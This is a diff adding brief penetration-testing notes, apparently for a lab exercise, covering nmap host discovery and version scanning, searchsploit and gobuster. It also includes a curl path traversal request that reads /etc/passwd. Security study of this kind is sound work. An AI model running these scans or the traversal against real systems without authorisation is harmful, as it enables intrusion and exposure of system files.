@@ -1,0 +1,25 @@
+To crack someone's vm
+
+Use host detection
+    ifconfig | grep inet 
+    Or: VMware tells you the IP address
+
+    nmap -sn 172.16.41.0/24
+
+Enumeration: 
+    nmap -sV -oN nmap-results-txt 172.16.41.141
+    -sV: if you find a server listening on a port, try to figure out version. 
+    -sC: takes longer
+
+ports range from 0-65535
+--> -sV does 1000 most common?
+--> 80 (web server),443 (https), 22 (ssh), 25 (smtp)...
+
+
+Kali: searchsploit apache 2.4 
+2.4.52 has no public exploits, but can try
+
+
+curl --path-as-is http://172.16.41.141/../../../etc/passwd
+
+Try gobuster
